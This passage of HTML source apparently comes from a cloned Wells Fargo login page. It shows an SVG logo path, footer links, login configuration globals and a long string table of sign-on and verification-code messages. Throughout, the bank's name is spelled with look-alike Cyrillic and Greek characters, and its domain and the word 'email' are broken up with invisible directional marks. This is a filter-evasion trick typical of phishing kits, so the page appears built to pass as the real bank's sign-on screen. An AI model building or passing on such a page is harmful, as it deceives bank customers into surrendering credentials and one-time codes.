  107.362986,6.71282213 107,7 L108,9 C108.421908,8.64865754 109.611873,11.0515038 111,13 C111.267363,14.3921381 105.996005,10.6829526 106,11 C105.184377,11.3038403 106.217935,12.7081012 106,13 C106.783327,14.0617871 106.42824,14.1285029
  106,14 C106.107499,14.3695408 102.866269,15.9244503 101,17 L99,17 C100.244329,15.5828006 101.426897,12.9125529 102,12 C102.68397,10.9960866 101.130463,11.436196 100,13 C99.7877882,13.3569665 98.0556803,15.781334 97,17 L97,20 C96.9381061,21.9557774
  98.3827623,23.5327461 100,24 L100,24 Z M86,3 L75,2 C74.7261785,1.03611093 73.3046805,0.060669542 72,9.32587341e-15 C69.1627569,-0.0854058828 67.0875503,1.86601197 67,4 L67,4 C74.4879357,4.77949434 80.9533903,5.40981248 86,6 L86,3 Z M47,8
  C48.7826181,8.11162258 49.6265497,9.04867098 50,10 C49.9757444,9.92306945 50.4134373,9.91820868 51,10 L51,10 L51,8 C58.9743048,8.16401088 68.8972981,8.50534493 74,9 C75.4786849,9.06325329 75.7020629,10.1931122 76,11 C75.6855361,10.886042 76.5625213,10.9616539
  77,11 L77,9 C83.0554099,9.59739788 89.1377948,10.1785299 95,11 C95.0133286,10.3400155 94.9754769,9.78102696 95,9 C91.3454516,8.66413008 79.3017003,6.76248893 63,6 C46.3819713,5.58348221 34.3782042,6.62692746 30,7 C29.986348,7.49322465 30.0247327,8.04843257 30,9
  C35.9082633,8.29903226 41.3546341,8.16239062 47,8 L47,8 Z M172,40 C164.916356,38.2045713 155.733318,38.5697224 152,44 L152,44 C154.27967,42.554115 161.494724,40.0982617 171,42 C178.710327,43.4016051 183,39.437593 183,39 C182.955321,39.4562752 177.734845,41.3318496 172,40
  L172,40 Z M64,4 L64,9.41469125e-14 L54,9.41469125e-14 C53.4158437,-0.0295043567 52.6578063,0.544678284 52,1 L41,1 C39.9471528,0.916388685 39.0824753,1.70071297 39,3 L39,4 C42.7087623,3.82360373 47.2564614,3.68095283 53,4 C56.7106535,3.68095283
  63.4615465,3.88444766 64,4 L64,4 Z M113,65 C111.82278,75.590352 102.697673,82.9687511 93,82 C88.7431363,81.492537 85.1099771,80.0900535 81,76 C82.2141355,74.5720154 84.1573414,78.6020852 93,79 C101.477894,80.299491 109.28598,73.8208186 110,65 C111.119123,56.5032192
  104.8204,48.7144936 96,48 C95.4030377,47.7175281 94.63206,47.6897456 94,48 C93.5036435,49.5725463 91.9568794,52.2359293 90,54 C89.8886501,54.2336001 89.1759097,53.0432256 89,53 C87.5105336,50.4060223 86.7299387,49.5971232 86,50
  C85.8312661,50.1159085 86.1865677,51.2833091 88,54 C87.7872949,54.2795482 88.4658408,55.4870197 88,56 C88.4631694,55.5687644 87.0980632,56.7431106 86,58 C85.781043,57.5578868 84.1017754,56.6298434 83,56 C81.5601669,55.3486413 80.636917,55.1253125
  80,56 C80.1817035,55.9128404 80.8319322,56.5988552 82,58 C82.9055043,57.9794333 84.0387294,58.6777365 84,59 C82.3770934,59.6656192 80.0609544,60.665256 78,61 L78,61 L78,61 C77.7223753,62.5074515 77.6059005,63.7624739 78,65
  C77.6059005,66.4856962 76.9230803,66.4889018 76,67 C75.9260987,64.6467064 75.9720474,62.7975652 76,62 C77.1774014,51.4088648 86.3030425,44.0299315 96,45 C106.591031,46.1766662 113.970084,55.3037618 113,65 L113,65 Z
"></path>
            </svg>
                      
            <ul class="Links__links___3VDkG">
             <li><a data-accessible-id="LYNRBYBJ" role="link" tabindex="0"><span>About Wеlls Fаrɡο</span></a></li>
             <li><a data-accessible-id="LZHAFPPR" role="link" tabindex="0"><span>Online Access Agreement</span></a></li>
             <li><a data-accessible-id="DBXJIRMF" role="link" tabindex="0"><span>Privacy, Cookies, Security &amp; Legal</span></a></li>
             <li><a data-accessible-id="AAOQGSGT" role="link" tabindex="0"><span>Notice of Data Collection</span></a></li>
             <li><a data-accessible-id="GATRUEEZ" role="link" tabindex="0"><span>Report e‎‏m‎‏a‎‏i‎‏l‎‏ Fraud</span></a></li>
             <li><a data-accessible-id="KWTMVPQJ" role="link" tabindex="0"><span>Security Center</span></a></li>
             <li><a data-accessible-id="MRECQNEG" role="link" tabindex="0"><span>Sitemap</span></a></li>
             <li><a data-accessible-id="XSAUMCAB" role="link" tabindex="0"><span>Ad Choices</span></a></li>
            </ul>
            
            <div class="CopyRight__copyright___2ocs-">
             © 1999 - 2021 WеІІѕ Fаrɡο. All rights reserved. NMLSR ID 399801
            </div>
           </div>
          </div>
         </div>
        </div>
       </div>
      </div>
     </div>
    </div>
   </div>
  </div> 
  <script nonce="">
		window.isReact = true;
		window.mwfGlobals = window.mwfGlobals || {};
		window.mwfGlobals.tmsWaitForAppReady = true
		window.mwfGlobals.tmsSwitch = true
		window.mwfGlobals.utagUrl = 'https://static.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com/tracking/secure-auth/utag.js';
		window.mwfGlobals.pageId = 'LOGIN';
		window.mwfGlobals.devicePlatform = '7M';
		window.mwfGlobals.rootContextPath = "/auth";
		window.mwfGlobals.webAssetsPath = "/auth/static/ui/loginaltsignon/";
		window.mwfGlobals.accountsNavigationUrl = 'https:\/\/www.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com';
		window.mwfGlobals.language = "en";
		window.mwfGlobals.unauthenticated=true;
		window.mwfGlobals.searchPublicUrl='https:\/\/www.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.com\/search\/search?';
		window.mwfGlobals.useAltMasthead = true;
		window.mwfGlobals.useModernButtons = true;
		window.mwfGlobals.useNewFooter= true;
		window.mwfGlobals.useWFFonts = true;
		window.mwfGlobals.useBrowserHistory = true;
		window.mwfGlobals.hideMobileMastheadMenus = true;
		window.mwfGlobals.enableLogoffPrompt = false;
		window.mwfGlobals.errorMessageText= '';
		window.mwfGlobals.errorCode='';
		window.mwfGlobals.loginParams= 'com.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏.online.loginapp.domain.LoginStartupParams@188a9764';
		window.mwfGlobals.uiOrigin= 'cob';
		window.mwfGlobals.jsenabled = true;
		window.mwfGlobals.loginUserPrefs=true;
		window.mwfGlobals.signonContext ='';
		window.mwfGlobals.ndHtml = ''
		window.mwfGlobals.appName ="altsignon";
		window.mwfGlobals.applicationPath ="/";
		window.mwfGlobals.brand = 'mm'
		window.mwfGlobals.lifestyleImagePath  = 'https:\/\/www10.w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏media.com\/auth\/static\/images\/COB\-BOB\-IRT\-enroll_tractor.jpg'
		window.mwfGlobals.messengerWebSDK = {enableNuanceWebSDKChat : false};
		window.mwfGlobals.embeddedStrings ='\/*w‎‏e‎‏l‎‏l‎‏s‎‏f‎‏a‎‏r‎‏g‎‏o‎‏Proprietary%{\x22global.help\x22:\x22Help\x22,\x22global.signoff\x22:\x22Sign Off\x22,\x22global.opensDialog\x22:\x22Opens dialog\x22,\x22global.messagecenter.a11yText\x22:\x22new messages in\x22,\x22global.messagecenter.label\x22:\x22Message Center\x22,\x22session.timeout.warning.heading\x22:\x22Do you want to continue your session?\x22,\x22session.timeout.warning.message\x22:\x22For security reasons, your session will timeout at {time} unless you continue.\x22,\x22session.timeout.warning.continue\x22:\x22Continue Session\x22,\x22global.ok\x22:\x22OK\x22,\x22global.accountSummary\x22:\x22Account Summary\x22,\x22global.alerts\x22:\x22Alerts and Notifications\x22,\x22global.back\x22:\x22Back\x22,\x22global.backspace\x22:\x22Backspace\x22,\x22global.camera\x22:\x22Camera\x22,\x22global.cancel\x22:\x22Cancel\x22,\x22global.clear\x22:\x22Clear\x22,\x22global.clear.text\x22:\x22Clear text\x22,\x22global.mask\x22:\x22Mask\x22,\x22global.unmask\x22:\x22Unmask\x22,\x22global.close\x22:\x22Close\x22,\x22global.continue\x22:\x22Continue\x22,\x22global.dialog.begin\x22:\x22Beginning of dialog\x22,\x22global.dialog.end\x22:\x22End of dialog\x22,\x22global.begin.region\x22:\x22Begin region\x22,\x22global.end.region\x22:\x22End of region\x22,\x22global.scrollable\x22:\x22Scrollable\x22,\x22global.footnote\x22:\x22Footnotes\x22,\x22global.menu.close\x22:\x22Close menu\x22,\x22global.menu.open\x22:\x22Open menu\x22,\x22global.navigation.confirm\x22:\x22If you leave this page, the information you entered will be lost.\x22,\x22global.navigation.confirm.heading\x22:\x22Leave This Page?\x22,\x22global.no\x22:\x22No\x22,\x22global.no.internet.connection\x22:\x22No Internet Connection\x22,\x22global.print\x22:\x22Print\x22,\x22global.quick.guide\x22:\x22Quick Guide\x22,\x22global.select.date.input\x22:\x22Use {format} format\x22,\x22global.select.date.button\x22:\x22Select date\x22,\x22global.signoff.confirm\x22:\x22Are you sure you want to sign off?\x22,\x22global.signoff.confirm.heading\x22:\x22Sign Off\x22,\x22global.skip.link\x22:\x22Skip to main content\x22,\x22global.title\x22:\x22WеІІѕ Fаrɡο Online\x22,\x22global.working\x22:\x22Working\x22,\x22global.yes\x22:\x22Yes\x22,\x22global.navigation.menu\x22:\x22Navigation Menu\x22,\x22global.no.selection\x22:\x22Select one...\x22,\x22label.no.matches\x22:\x22No results match <strong>{searchValue}<\/strong>\x22,\x22label.no.matches.a11y\x22:\x22No results match {searchValue}\x22,\x22label.no.selection\x22:\x22Select\x22,\x22global.select.list.select\x22:\x22Select\x22,\x22global.searchable.select.toggle.open\x22:\x22Toggle list open\x22,\x22global.searchable.select.toggle.closed\x22:\x22Toggle list closed\x22,\x22global.tooltip\x22:\x22Tool Tip\x22,\x22global.ariaLive.label\x22:\x22Status message history\x22,\x22global.message.error\x22:\x22Error\x22,\x22global.message.success\x22:\x22Success\x22,\x22global.message.confirm\x22:\x22Confirm\x22,\x22global.message.info\x22:\x22Info\x22,\x22global.message.disaster\x22:\x22Disaster\x22,\x22global.message.urgent\x22:\x22Urgent\x22,\x22global.message.alert\x22:\x22Alert\x22,\x22global.message.warning\x22:\x22Warning\x22,\x22global.days.monday\x22:\x22Monday\x22,\x22global.days.tuesday\x22:\x22Tuesday\x22,\x22global.days.wednesday\x22:\x22Wednesday\x22,\x22global.days.thursday\x22:\x22Thursday\x22,\x22global.days.friday\x22:\x22Friday\x22,\x22global.days.saturday\x22:\x22Saturday\x22,\x22global.days.sunday\x22:\x22Sunday\x22,\x22global.months.january\x22:\x22January\x22,\x22global.months.february\x22:\x22February\x22,\x22global.months.march\x22:\x22March\x22,\x22global.months.april\x22:\x22April\x22,\x22global.months.may\x22:\x22May\x22,\x22global.months.june\x22:\x22June\x22,\x22global.months.july\x22:\x22July\x22,\x22global.months.august\x22:\x22August\x22,\x22global.months.september\x22:\x22September\x22,\x22global.months.october\x22:\x22October\x22,\x22global.months.november\x22:\x22November\x22,\x22global.months.december\x22:\x22December\x22,\x22global.calendar\x22:\x22Calendar\x22,\x22global.month.next\x22:\x22Next month\x22,\x22global.month.previous\x22:\x22Previous month\x22,\x22global.year.next\x22:\x22Next year\x22,\x22global.year.previous\x22:\x22Previous year\x22,\x22error.emptyAndRequired\x22:\x22Please enter this field.\x22,\x22error.pleaseEnterTheseFields\x22:\x22Please enter these fields.\x22,\x22error.required\x22:\x22Please enter {fieldName}.\x22,\x22error.requiredLong\x22:\x22Please enter this field.\x22,\x22error.minLength\x22:\x22Enter at least {minLength} characters for {fieldName}.\x22,\x22error.maxLength\x22:\x22Enter no more than {maxLength} characters for {fieldName}.\x22,\x22error.dataType.ALL\x22:\x22Please enter {fieldName}.\x22,\x22error.dataType.ALPHA\x22:\x22Please use letters only in {fieldName}.\x22,\x22error.dataType.ALPHA_NUMERIC\x22:\x22Please use letters and numbers only in {fieldName}.\x22,\x22error.dataType.ALPHA_NUMERIC_SPACE\x22:\x22Please use letters, defaultMessage: numbers and spaces only in {fieldName}.\x22,\x22error.dataType.ALPHA_SPACE\x22:\x22Please use letters and spaces only in {fieldName}.\x22,\x22error.dataType.DATE_MM_YY\x22:\x22Please enter a valid date for {fieldName}.\x22,\x22error.dataType.DATE_MM_DD_YYYY\x22:\x22Please enter a valid date for {fieldName}.\x22,\x22error.dataType.DATE_DD_MM_YYYY\x22:\x22Please enter a valid date for {fieldName}.\x22,\x22error.dataType.NUMERIC\x22:\x22Please enter numbers for {fieldName}.\x22,\x22error.dataType.NUMERIC_DECIMAL\x22:\x22Please enter numbers for {fieldName}.\x22,\x22error.dataType.DOLLAR_NUMERAL\x22:\x22Please enter numbers for {fieldName}.\x22,\x22error.dataType.DOLLAR_NUMERAL_DECIMAL\x22:\x22Please enter numbers for {fieldName}.\x22,\x22error.dataType.EMPLOYER_IDENTIFICATION_NUMBER\x22:\x22Please enter a valid employer identification number for {fieldName}.\x22,\x22error.dataType.NUMERAL_DECIMAL\x22:\x22Please enter numbers for {fieldName}.\x22,\x22error.dataType.NUMERAL\x22:\x22Please enter numbers for {fieldName}.\x22,\x22error.dataType.PERCENTAGE\x22:\x22Please enter numbers for {fieldName}.\x22,\x22error.dataType.PERCENTAGE_DECIMAL\x22:\x22Please enter numbers for {fieldName}.\x22,\x22error.dataType.PHONE\x22:\x22Please enter 10 numbers for {fieldName}.\x22,\x22error.dataType.e‎‏m‎‏a‎‏i‎‏l‎‏\x22:\x22Please enter a valid e‎‏m‎‏a‎‏i‎‏l‎‏ address for {fieldName}.\x22,\x22error.dataType.SSN\x22:\x22Please enter a valid social security number for {fieldName}.\x22,\x22label.error\x22:\x22Error\x22,\x22brandToggle.legend\x22:\x22Set brand to\x22,\x22languageToggle.legend\x22:\x22Set language to\x22,\x22platformToggle.legend\x22:\x22Set platform to\x22,\x22core.states.AL\x22:\x22Alabama\x22,\x22core.states.AK\x22:\x22Alaska\x22,\x22core.states.AZ\x22:\x22Arizona\x22,\x22core.states.AR\x22:\x22Arkansas\x22,\x22core.states.AA\x22:\x22Armed Forces \- AA\x22,\x22core.states.AE\x22:\x22Armed Forces \- AE\x22,\x22core.states.AP\x22:\x22Armed Forces \- AP\x22,\x22core.states.CA\x22:\x22California\x22,\x22core.states.CO\x22:\x22Colorado\x22,\x22core.states.CT\x22:\x22Connecticut\x22,\x22core.states.DE\x22:\x22Delaware\x22,\x22core.states.DC\x22:\x22District of Columbia\x22,\x22core.states.FL\x22:\x22Florida\x22,\x22core.states.GA\x22:\x22Georgia\x22,\x22core.states.GU\x22:\x22Guam\x22,\x22core.states.HI\x22:\x22Hawaii\x22,\x22core.states.ID\x22:\x22Idaho\x22,\x22core.states.IL\x22:\x22Illinois\x22,\x22core.states.IN\x22:\x22Indiana\x22,\x22core.states.IA\x22:\x22Iowa\x22,\x22core.states.KS\x22:\x22Kansas\x22,\x22core.states.KY\x22:\x22Kentucky\x22,\x22core.states.LA\x22:\x22Louisiana\x22,\x22core.states.ME\x22:\x22Maine\x22,\x22core.states.MD\x22:\x22Maryland\x22,\x22core.states.MA\x22:\x22Massachusetts\x22,\x22core.states.MI\x22:\x22Michigan\x22,\x22core.states.MN\x22:\x22Minnesota\x22,\x22core.states.MS\x22:\x22Mississippi\x22,\x22core.states.MO\x22:\x22Missouri\x22,\x22core.states.MT\x22:\x22Montana\x22,\x22core.states.NE\x22:\x22Nebraska\x22,\x22core.states.NV\x22:\x22Nevada\x22,\x22core.states.NH\x22:\x22New Hampshire\x22,\x22core.states.NJ\x22:\x22New Jersey\x22,\x22core.states.NM\x22:\x22New Mexico\x22,\x22core.states.NY\x22:\x22New York\x22,\x22core.states.NC\x22:\x22North Carolina\x22,\x22core.states.ND\x22:\x22North Dakota\x22,\x22core.states.OH\x22:\x22Ohio\x22,\x22core.states.OK\x22:\x22Oklahoma\x22,\x22core.states.OR\x22:\x22Oregon\x22,\x22core.states.PA\x22:\x22Pennsylvania\x22,\x22core.states.PR\x22:\x22Puerto Rico\x22,\x22core.states.RI\x22:\x22Rhode Island\x22,\x22core.states.SC\x22:\x22South Carolina\x22,\x22core.states.SD\x22:\x22South Dakota\x22,\x22core.states.TN\x22:\x22Tennessee\x22,\x22core.states.TX\x22:\x22Texas\x22,\x22core.states.UT\x22:\x22Utah\x22,\x22core.states.VT\x22:\x22Vermont\x22,\x22core.states.VI\x22:\x22Virgin Islands\x22,\x22core.states.VA\x22:\x22Virginia\x22,\x22core.states.WA\x22:\x22Washington\x22,\x22core.states.WV\x22:\x22West Virginia\x22,\x22core.states.WI\x22:\x22Wisconsin\x22,\x22core.camera.enable\x22:\x22WеІІѕ Fаrɡο requires access to your camera. Please change your camera settings and sign back on to complete this request.\x22,\x22core.camera.enable.android\x22:\x22WеІІѕ Fаrɡο requires access to your camera. Please change your camera settings to complete this request.\x22,\x22core.camera.access\x22:\x22WеІІѕ Fаrɡο requires access to your camera to complete this request. For instructions on how to turn on access to your camera, please visit the\x22,\x22core.camera.no.support\x22:\x22Device doesn\x27t have camera support.\x22,\x22global.beginContent\x22:\x22Begin content\x22,\x22global.endContent\x22:\x22End content\x22,\x22core.interdiction.label.phoneType.HOME\x22:\x22Home\x22,\x22core.interdiction.label.phoneType.WORK\x22:\x22Work\x22,\x22core.interdiction.label.phoneType.MOBILE\x22:\x22Mobile\x22,\x22core.interdiction.label.phoneType.OTHER\x22:\x22Other\x22,\x22core.interdiction.label.purposeCode.PRIMARY\x22:\x22Primary\x22,\x22core.interdiction.label.purposeCode.SECONDARY\x22:\x22Secondary\x22,\x22core.interdiction.label.purposeCode.OTHER\x22:\x22Other\x22,\x22core.interdiction.label.lastName\x22:\x22Last Name\x22,\x22core.interdiction.label.rsaCode\x22:\x22RSA Code\x22,\x22core.interdiction.label.with.html\x22:\x22Hello, my name is <strong>{name}<\/strong>.\x22,\x22core.interdiction.label.without.html\x22:\x22Hello, my name is {name}.\x22,\x22core.interdiction.label.verifyYourIdentity\x22:\x22Verify Your Identity\x22,\x22core.interdiction.label.oow\x22:\x22OOW\x22,\x22core.interdiction.label.walletOw\x22:\x22WalletOW\x22,\x22core.interdiction.label.wowOfWallet\x22:\x22Wow Of Wallet\x22,\x22core.interdiction.label.sendCode\x22:\x22Send Code\x22,\x22core.interdiction.label.contactInformation\x22:\x22Contact Information\x22,\x22core.interdiction.label.sendTo\x22:\x22Send code to\x22,\x22core.interdiction.label.forYourSecurity\x22:\x22For your security, an\x22,\x22core.interdiction.label.advancedAccess\x22:\x22Advanced Access\x22,\x22core.interdiction.label.codeIsRequired\x22:\x22code is required.\x22,\x22core.interdiction.label.recentUpdates\x22:\x22Recent updates to your contact information may not be immediately available for selection.\x22,\x22core.interdiction.label.sendCodeTo\x22:\x22Send code to\x22,\x22core.interdiction.label.contactInformationHelp\x22:\x22Contact Information Help\x22,\x22core.interdiction.label.deliveryMethod\x22:\x22Delivery method\x22,\x22core.interdiction.label.sendCodeByPhoneOre‎‏m‎‏a‎‏i‎‏l‎‏\x22:\x22By selecting <strong>Get Code<\/strong>, you agree WеІІѕ Fаrɡο may deliver a one\-time verification code to you using the delivery method above. You also agree WеІІѕ Fаrɡο may send the code using an autodialer or artificial or prerecorded voice message to the phone number displayed. Your mobile carrier\x27s messaging and data rates may apply.\x22,\x22core.interdiction.label.sendCodeByPushNotification\x22:\x22Push notifications containing information about your request may be visible to those who have access to your devices. Your mobile carrier\x27s messaging and data rates may apply.\x22,\x22core.interdiction.label.sendCodeByPhone\x22:\x22By selecting <strong>Get Code<\/strong>, you agree that we may send the code to the contact information you provided. If you have provided a mobile number, we may send the code by text message.\x22,\x22core.interdiction.label.sendCodeBye‎‏m‎‏a‎‏i‎‏l‎‏\x22:\x22By selecting <strong>Get Code<\/strong>, you agree that we may send the code to the e‎‏m‎‏a‎‏i‎‏l‎‏ address you provided.\x22,\x22core.interdiction.label.carrierMessaging\x22:\x22<strong>Carrier messaging and data rates may apply.<\/strong>\x22,\x22core.interdiction.label.rsaSecurId\x22:\x22RSA SecurID<sup>\x26reg;<\/sup>\x22,\x22core.interdiction.label.interdictionForms\x22:\x22interdiction forms\x22,\x22core.interdiction.label.selectPhoneNumber\x22:\x22Select Phone Number\x22,\x22core.interdiction.label.selection\x22:\x22Select one...\x22,\x22core.interdiction.label.selectDeliveryMethod\x22:\x22Select Delivery Method\x22,\x22core.interdiction.label.promoCode\x22:\x22Code\x22,\x22core.interdiction.label.codeSentByText\x22:\x22The code was sent to <strong>{phDisplayNumber}<\/strong> by text message. Enter your code as soon as you receive it.\x22,\x22core.interdiction.label.codeSentByPhone\x22:\x22The code was sent to <strong>{phDisplayNumber}<\/strong> by phone call. Enter your code as soon as you receive it.\x22,\x22core.interdiction.label.codeSentBye‎‏m‎‏a‎‏i‎‏l‎‏\x22:\x22The code was sent to <strong>{phDisplayNumber}<\/strong> by e‎‏m‎‏a‎‏i‎‏l‎‏. Enter your code as soon as you receive it.\x22,\x22core.interdiction.label.accessCodeHelp\x22:\x22Access Code Help\x22,\x22core.interdiction.label.ocsCodeHelp\x22:\x22Customer Service has provided your code to you. Enter your code below as soon as you receive it.\x22,\x22core.interdiction.label.otpSuccessPage\x22:\x22OTP Success page\x22,\x22core.interdiction.label.fobConfirmationPage\x22:\x22FOB Confirmation page\x22,\x22core.interdiction.label.fobAuthentication\x22:\x22RSA SecurID\x22,\x22core.interdiction.label.oowQuestion\x22:\x22<strong>question holder<\/strong>\x22,\x22core.interdiction.label.oowAboutQuestions\x22:\x22About these questions\x22,\x22core.interdiction.label.oowAuthentication\x22:\x22For your security, please verify your identity by answering the following questions. If you need assistance, please call us at <strong>{oowPhoneNumber}<\/strong>.\x22,\x22core.interdiction.label.enterRSACode\x22:\x22Enter code from your RSA SecurID<sup>\x26reg;<\/sup> device below:\x22,\x22core.interdiction.label.secureID\x22:\x22SecurID<sup>\x26reg;<\/sup> is a registered trademark of RSA Security, Inc.\x22,\x22core.interdiction.button.label.cancel\x22:\x22Cancel\x22,\x22core.interdiction.button.label.verifyCode\x22:\x22Verify Code\x22,\x22core.interdiction.button.label.getCode\x22:\x22Get Code\x22,\x22core.interdiction.button.label.submit\x22:\x22Submit\x22,\x22label.error.2fa.codeLength\x22:\x22Your Advanced Access code should be 6 digits. Please try again.\x22,\x22label.error.call.unable.otp\x22:\x22We were unable to deliver your Advanced Access code by phone. Please check the number and try again or change the delivery method.\x22,\x22label.error.text.unable.otp\x22:\x22We were unable to deliver your Advanced Access code by text. Please check the number and try again or change the delivery method.\x22,\x22label.error.text.unable.nocall.otp\x22:\x22Your Advanced Access code could not be delivered. Please confirm the phone number you used can receive text messages. You can select a different phone number, or try again later.\x22,\x22label.error.call.unable.e‎‏m‎‏a‎‏i‎‏l‎‏\x22:\x22We were unable to deliver your Advanced Access code by e‎‏m‎‏a‎‏i‎‏l‎‏. Please check that your e‎‏m‎‏a‎‏i‎‏l‎‏ address is correct and try again or change the delivery method.\x22,\x22label.error.otp.emptytext\x22:\x22\x22,\x22label.error.otp.entryFailureLimit\x22:\x22For your security, we have temporarily locked Advanced Access for your account. To unlock Advanced Access, please call us at 1\-866\-609\-3037.\x22,\x22label.error.otp.AlreadyLockedOut\x22:\x22You have exceeded the maximum number of requests.  For your security, we have temporarily locked this service.  Please try again later.\x22,\x22label.error.otp.Timeout\x22:\x22Your code has expired. Please select Back and request a new code.\x22,\x22label.error.otp.NoDeliveryMethod\x22:\x22Please tell us how you would like to receive your code.\x22,\x22label.error.otp.InvalidCodeEntry\x22:\x22Invalid code. Please try again.\x22,\x22label.error.otp.sorDown\x22:\x22We\x27re sorry. This service is temporarily unavailable. Please try again later.\x22,\x22label.error.fob.lockOut\x22:\x22<p>We are unable to complete your request. Please call us at 1\-866\-609\-3037 to confirm your identity.<\/p><p>If you\x27re a guest user, please have your administrator contact us at {1}.<\/p><p>Thank you for helping us keep your account safe.<\/p>\x22,\x22label.error.fob.IncorrectFormat\x22:\x22Authentication failed. Please wait for your RSA SecurID<sup>\x26reg;<\/sup> device to generate a new 6\-digit code and try again.\x22,\x22label.error.fob.InvalidCodeEntry\x22:\x22The code you entered was not correct. Please wait for your RSA SecurID<sup>\x26reg;<\/sup> device to generate a new 6\-digit code and try again.\x22,\x22label.error.oow.pleaseselectatleastonechoice\x22:\x22Please select an answer from the choices displayed to continue.\x22,\x22label.error.oow.failedToAnswerQuestions\x22:\x22<p>We are unable to complete your request. Please call us at 1\-866\-609\-3037 to confirm your identity.<\/p><p>If you\x27re a guest user, please have your administrator contact us at {1}.<\/p><p>Thank you for helping us keep your account safe.<\/p>\x22,\x22label.error.oow.questionnaireerror\x22:\x22System is down. Please try after sometime.\x22,\x22label.error.oow.sorDown\x22:\x22We\x27re sorry. This service is temporarily unavailable. Please try again later.\x22,\x22label.error.otp.maxFailureLimit\x22:\x22You submitted an invalid Advanced Access code. For your security, we have temporarily locked Advanced Access for your account. To unlock Advanced Access by phone, please call us at 1\-866\-609\-3037.\x22,\x22label.error.otpFobOow.accessBlocked\x22:\x22<p>We are unable to complete your request. Please call us at 1\-866\-609\-3037 to verify your identity.<\/p><p>If you\x27re a guest user, please ask your administrator to contact us.<\/p>\x22,\x22label.error.fob.authSysDown\x22:\x22We\x27re sorry. This service is temporarily unavailable. Please try again later.\x22,\x22label.error.oow.InvalidDataEntry\x22:\x22<p>Our system is currently unavailable, and we apologize for any inconvenience. Please try again later or call us:<\/p><section class=\x27phonenumber\-help\x27><ul><li>For account questions, please use the phone directory to find the appropriate customer service number.<\/li><li> To pay a bill: 1\-800\-956\-4442.<\/li><li>For assistance with brokerage accounts: 1\-866\-281\-7436.<\/li><li>To apply for an account: 1\-800\-WFB\-OPEN (1\-800\-932\-6736).<\/li><\/ul><\/section>\x22,\x22AA_AUTH_LOCKED\x22:\x22For your security, we have temporarily locked Advanced Access for your account. To unlock Advanced Access, please call us at 1\-866\-609\-3037.\x22,\x22AA_OTP_CODE_DELIVERY_ERROR\x22:\x22We were unable to deliver your Advanced Access code by text. Please check the number and try again or change the delivery method.\x22,\x22AA_VERIFY_LOCKED\x22:\x22You have exceeded the maximum number of requests.  For your security, we have temporarily locked this service.  Please try again later.\x22,\x22INVALID_DATA\x22:\x22We\x27re sorry. This service is temporarily unavailable. Please try again later.\x22,\x22SYSTEM,SYSTEM_DOWN\x22:\x22We\x27re sorry. This service is temporarily unavailable. Please try again later.\x22,\x22SYSTEM_DOWN\x22:\x22We\x27re sorry. This service is temporarily unavailable. Please try again later.\x22,\x22AUTH_SYSTEM_DOWN\x22:\x22We\x27re sorry. This service is temporarily unavailable. Please try again later.\x22,\x22AUTH_FAILED\x22:\x22The code you entered was not correct. Please wait for your RSA SecurID<sup>\x26reg;<\/sup> device to generate a new 6\-digit code and try again.\x22,\x22AUTH_DISABLED\x22:\x22<p>We are unable to complete your request. Please call us at 1\-866\-609\-3037 to verify your identity.<\/p><p>If you\x27re a guest user, please ask your administrator to contact us.<\/p>\x22,\x22MAX_FAILURES_REACHED\x22:\x22<p>We are unable to complete your request. Please call us at 1\-866\-609\-3037 to verify your identity.<\/p><p>If you\x27re a guest user, please ask your administrator to contact us.<\/p>\x22,\x22VALIDATION_FAILURE\x22:\x22Invalid code. Please try again.\x22,\x22EXPIRED\x22:\x22Your code has expired. Please select Back and request a new code.\x22,\x22NOT_FOUND\x22:\x22We\x27re sorry. This service is temporarily unavailable. Please try again later.\x22,\x22SYSTEM_UNAVAILABLE_HEADER\x22:\x22System is Unavailable\x22,\x22ACCESS_BLOCKED\x22:\x22Contact Us for Assistance\x22,\x22VALIDATION_FAILED_OR_EXPIRED\x22:\x22Validation Failed Or Expired\x22,\x22verify\-your\-identity\x22:\x22Verify Your Identity\x22,\x22advanced\-access\x22:\x22Advanced Access\x22,\x22interdiction.common.button.getCode\x22:\x22Get Code\x22,\x22interdiction.common.button.verifyCode\x22:\x22Verify Code\x22,\x22contact\-information\-help\x22:\x22Contact Information Help\x22,\x22confirm\-your\-identity\x22:\x22Verify Your Identity\x22,\x22lets\-verify\-your\-identity\x22:\x22Let\x27s Verify Your Identity\x22,\x22core.interdiction.label.e‎‏m‎‏a‎‏i‎‏l‎‏.youAgree\x22:\x22you agree that we may send the code to the e‎‏m‎‏a‎‏i‎‏l‎‏ address you provided\x22,\x22core.interdiction.help.receiveCode\x22:\x22<p>You may not receive your code immediately. Please allow a few minutes for delivery. Once you receive your code, please enter it immediately.<\/p><p>If you did not receive your code, please verify that: <\/p>\x22,\x22core.interdiction.help.codeNotReceived\x22:\x22If you did not receive your code, or if the code you received has expired, you can \x22,\x22core.interdiction.help.requestNewCode\x22:\x22request a new code.\x22,\x22core.interdiction.help.requestBye‎‏m‎‏a‎‏i‎‏l‎‏\x22:\x22<p>If you requested that we send your code by e‎‏m‎‏a‎‏i‎‏l‎‏, please be sure to check your spam or junk folder.<\/p><p>If you did not receive your code, please verify that:<ul><li>You requested that we send an e‎‏m‎‏a‎‏i‎‏l‎‏ to {e‎‏m‎‏a‎‏i‎‏l‎‏Address}.<\/li><\/ul>\x22,\x22core.interdiction.help.requestByText\x22:\x22<ol><li>You requested a text message to {phDisplayNumber}.<\/li><li>Your phone is on, has coverage, and is ready to receive text messages.<\/li><\/ol>\x22,\x22core.interdiction.help.requestByPhone\x22:\x22<ol><li>You requested a phone call to {phDisplayNumber}.<\/li><li>Your phone is on, has coverage, and is ready to receive text messages.<\/li><\/ol>\x22,\x22core.interdiction.info.push\x22:\x22To receive push notifications on your mobile device, the WеІІѕ Fаrɡο mobile app on your phone or tablet must be set to allow notifications.\x22,\x22core.interdiction.textMessage\x22:\x22Text message\x22,\x22core.interdiction.phoneCall\x22:\x22Phone call\x22,\x22core.interdiction.e‎‏m‎‏a‎‏i‎‏l‎‏\x22:\x22e‎‏m‎‏a‎‏i‎‏l‎‏\x22,\x22core.interdiction.push\x22:\x22Device alert (push a 